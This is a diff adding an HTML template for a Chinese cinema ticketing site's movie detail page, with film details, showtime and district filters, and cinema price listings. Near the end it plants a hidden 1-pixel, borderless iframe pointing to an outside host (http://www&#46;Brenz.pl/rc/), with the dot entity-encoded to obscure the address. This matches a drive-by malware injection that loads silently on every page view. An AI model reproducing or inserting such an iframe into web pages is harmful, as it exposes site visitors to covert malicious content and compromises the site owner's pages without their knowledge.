@@ -1,0 +1,304 @@
+<extend name="Public:templet" />
+<block name="css">
+	<link rel="stylesheet" type="text/css" href="__PUBLIC__/Home/css/movieDetail.css">
+</block>
+	
+	<block name="main">
+		<div id="movie-details-main">	
+		<div class="movie-head">
+			<div class="box wrap">
+				<ul>
+					<li><a class="hover" href="">电影首页</a></li>
+					<li><a href="">电影院</a></li>
+					<li><a href="">电影票团购</a></li>
+					<li><a href="">在线选座</a></li>
+				</ul>
+			</div>
+		</div>
+
+		<foreach name="details" item="detail">
+			<div class="wrap">
+				<foreach name="details" item="detail">
+					<div class="path">
+					<ul>
+						<li><a href="">团购 ></a></li>
+						<li><a href="">电影 ></a></li>
+						<li style="color:#ff4883">{$detail.title} ></li>
+					</ul>
+					</div>
+				</foreach>
+					<div class="detail-main-left">
+						<img class="left-img" src="__PUBLIC__/home/images/thumbnails.jpg">
+						<foreach name="details" item="detail">
+							<div class="content">
+								<h2>{$detail.title}</h2>
+								<div class="de">
+									<p>
+										<span>导演:</span>{$detail.director}
+									</p>
+
+									<p>
+										<span>主演:</span>{$detail.performer}
+									</p>
+									<p>
+										<span>类型:</span>动作,冒险,惊悚
+									</p>
+										<ul>
+											<li>
+												<span>国家:</span>中国大陆
+											</li>
+											<li>
+												<span>首映:</span>{$detail.first_time}
+											</li>
+											<li>
+												<span>片长:</span>{$detail.len}分钟
+											</li>
+										</ul>
+									
+									<p class="intro">
+											<span>剧情:</span>
+											<span class="c">
+												{$detail.content}
+												<a id="j-summary-open"style="cursor:pointer">展开</a>
+											</span>
+											<span id="j-summary-more" class="c" style="display:none;">
+												{$detail.hide}
+												<a  id="j-summary-fold" style="cursor:pointer">收起</a>
+											</span>
+
+											</div>
+									</p>
+							</div>
+						</foreach>
+						<div class="spec-nav">
+							<ul>
+								<li><a href="" style="background:#ff4883;color:#fff">上映影院</a></li>
+								<li><a href="">热门影评</a></li>
+								<li><a href="">剧情海报</a></li>
+							</ul>
+						</div>
+
+						<div class="w-filter">
+							<div class="filter-date">
+								<ul>
+									<li class="first">放映时间:</li>
+									<li><a class="all" href="">全部</a></li>
+									<li><a href="">11.13(周五)</a></li>
+									<li><a href="">11.14(周六)</a></li>
+									<li><a href="">11.15(周日)</a></li>
+									<li><a href="">11.16(周一)</a></li>
+									<li><a href="">11.17(周二)</a></li>
+									<li><a href="">11.18(周三)</a></li>
+									<li><a href="">11.19(周四)</a></li>
+								</ul>
+							</div>
+							<div class="filter-date">
+								<ul>
+									<li class="first">区域:</li>
+									<li><a class="all">全部</a></li>
+									<li><a href="">二七区</a></li>
+									<li><a href="">金水区</a></li>
+									<li><a href="">中原区</a></li>
+									<li><a href="">上街区</a></li>
+									<li><a href="">中牟区</a></li>
+									<li><a href="">巩义区</a></li>
+									<li><a href="">新密区</a></li>
+									<li><a href="">新密区</a></li>
+									<li><a href="">新密区</a></li>
+									<li><a href="">新密区</a></li>
+									<li><a href="">新密区</a></li>
+									<li><a href="">新密区</a></li>
+								</ul>
+							</div>
+							<div class="filter-date">
+								<ul>
+									<li class="first">影院:</li>
+									<li><a class="all" href="">全部</a></li>
+									<li><a href="">保利国际影城</a></li>
+									<li><a href="">万达国际影城</a></li>
+									<li><a href="">耀莱成龙国际影城</a></li>
+									<li><a href="">奥斯卡国际影城</a></li>
+									<li><a href="">其他</a></li>		
+								</ul>
+							</div>
+							<div class="filter-date">
+								<ul>
+									<li class="first">排序:</li>
+									<li><a class="all" href="">默认</a></li>
+									<li><a href="">电影院评级</a></li>
+									<li><a href="">有选座</a></li>
+									<li><a href="">有团购</a></li>
+									
+								</ul>
+							</div>
+						</div>
+
+						<div class="filter-box">
+
+									<div class="ci-basic">
+										<div class="basic-top">
+											<h3>郑州欢乐国际影城</h3>
+											<h5>2.1分</h5>
+										</div>
+										<div class="basic-bottom">
+											<h3 style="font-size:13px;">郑州市航空港区沃金商业广场三层</h3>
+											<h5>查看地图</h5>
+										</div>
+									</div>
+
+									<div class="ci-buy">
+										<div class="buy-top"><span class="ci-price">&yen29起</span><span class="tuangou"><a href="">团购购票</a></span></div>
+										<div class="buy-bottom"><span class="price">&yen31起</span><span class="gou"><a href="">选座购票</a></span></div>
+									</div>
+						</div>
+
+						<div class="filter-box">
+
+									<div class="ci-basic">
+										<div class="basic-top">
+											<h3>郑州欢乐国际影城</h3>
+											<h5>2.1分</h5>
+										</div>
+										<div class="basic-bottom">
+											<h3 style="font-size:13px;">郑州市航空港区沃金商业广场三层</h3>
+											<h5>查看地图</h5>
+										</div>
+									</div>
+
+									<div class="ci-buy">
+										<div class="buy-top"><span class="ci-price">&yen29起</span><span class="tuangou"><a href="">团购购票</a></span></div>
+										<div class="buy-bottom"><span class="price">&yen31起</span><span class="gou"><a href="">选座购票</a></span></div>
+									</div>
+						</div>
+						<div class="filter-box">
+
+									<div class="ci-basic">
+										<div class="basic-top">
+											<h3>郑州欢乐国际影城</h3>
+											<h5>2.1分</h5>
+										</div>
+										<div class="basic-bottom">
+											<h3 style="font-size:13px;">郑州市航空港区沃金商业广场三层</h3>
+											<h5>查看地图</h5>
+										</div>
+									</div>
+
+									<div class="ci-buy">
+										<div class="buy-top"><span class="ci-price">&yen29起</span><span class="tuangou"><a href="">团购购票</a></span></div>
+										<div class="buy-bottom"><span class="price">&yen31起</span><span class="gou"><a href="">选座购票</a></span></div>
+									</div>
+						</div>
+						<div class="filter-box">
+
+									<div class="ci-basic">
+										<div class="basic-top">
+											<h3>郑州欢乐国际影城</h3>
+											<h5>2.1分</h5>
+										</div>
+										<div class="basic-bottom">
+											<h3 style="font-size:13px;">郑州市航空港区沃金商业广场三层</h3>
+											<h5>查看地图</h5>
+										</div>
+									</div>
+
+									<div class="ci-buy">
+										<div class="buy-top"><span class="ci-price">&yen29起</span><span class="tuangou"><a href="">团购购票</a></span></div>
+										<div class="buy-bottom"><span class="price">&yen31起</span><span class="gou"><a href="">选座购票</a></span></div>
+									</div>
+						</div>
+						<div class="filter-box">
+
+									<div class="ci-basic">
+										<div class="basic-top">
+											<h3>郑州欢乐国际影城</h3>
+											<h5>2.1分</h5>
+										</div>
+										<div class="basic-bottom">
+											<h3 style="font-size:13px;">郑州市航空港区沃金商业广场三层</h3>
+											<h5>查看地图</h5>
+										</div>
+									</div>
+
+									<div class="ci-buy">
+										<div class="buy-top"><span class="ci-price">&yen29起</span><span class="tuangou"><a href="">团购购票</a></span></div>
+										<div class="buy-bottom"><span class="price">&yen31起</span><span class="gou"><a href="">选座购票</a></span></div>
+									</div>
+						</div>
+						<div class="filter-box">
+
+									<div class="ci-basic">
+										<div class="basic-top">
+											<h3>郑州欢乐国际影城</h3>
+											<h5>2.1分</h5>
+										</div>
+										<div class="basic-bottom">
+											<h3 style="font-size:13px;">郑州市航空港区沃金商业广场三层</h3>
+											<h5>查看地图</h5>
+										</div>
+									</div>
+
+									<div class="ci-buy">
+										<div class="buy-top"><span class="ci-price">&yen29起</span><span class="tuangou"><a href="">团购购票</a></span></div>
+										<div class="buy-bottom"><span class="price">&yen31起</span><span class="gou"><a href="">选座购票</a></span></div>
+									</div>
+						</div>
+						<div class="filter-box">
+
+									<div class="ci-basic">
+										<div class="basic-top">
+											<h3>郑州欢乐国际影城</h3>
+											<h5>2.1分</h5>
+										</div>
+										<div class="basic-bottom">
+											<h3 style="font-size:13px;">郑州市航空港区沃金商业广场三层</h3>
+											<h5>查看地图</h5>
+										</div>
+									</div>
+
+									<div class="ci-buy">
+										<div class="buy-top"><span class="ci-price">&yen29起</span><span class="tuangou"><a href="">团购购票</a></span></div>
+										<div class="buy-bottom"><span class="price">&yen31起</span><span class="gou"><a href="">选座购票</a></span></div>
+									</div>
+						</div>
+					</div>
+
+
+					<div class="detail-main-right">
+						<h3>电影排行榜</h3>
+						<div class="movie-panel">
+							<img src="__PUBLIC__/home/images/621714-765jchkgbx-41465408023937296.jpg">
+							<div class="text">奥斯卡大上海20元</div>
+							<span class="price">&yen;20</span>
+							<span class="ori-price">原价&yen;50</sapn>
+							<span class="sold">已售80630</span>
+						</div>
+						<div class="movie-panel">
+							<img src="__PUBLIC__/home/images/621714-765jchkgbx-41465408023937296.jpg">
+							<div class="text">奥斯卡大上海20元</div>
+							<span class="price">&yen;20</span>
+							<span class="ori-price">原价&yen;50</sapn>
+							<span class="sold">已售80630</span>
+						</div>
+						<div class="movie-panel">
+							<img src="__PUBLIC__/home/images/621714-765jchkgbx-41465408023937296.jpg">
+							<div class="text">奥斯卡大上海20元</div>
+							<span class="price">&yen;20</span>
+							<span class="ori-price">原价&yen;50</sapn>
+							<span class="sold">已售80630</span>
+						</div>
+					</div>
+					</div>
+					
+				</div>
+			</div>
+		
+		</div>
+		</div>
+		<div class="clear"></div>
+	
+<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
+</body>
+</block>
+<block name='js'>
+	<script src="__PUBLIC__/home/js/movieDetail.js"></script>
+</block>
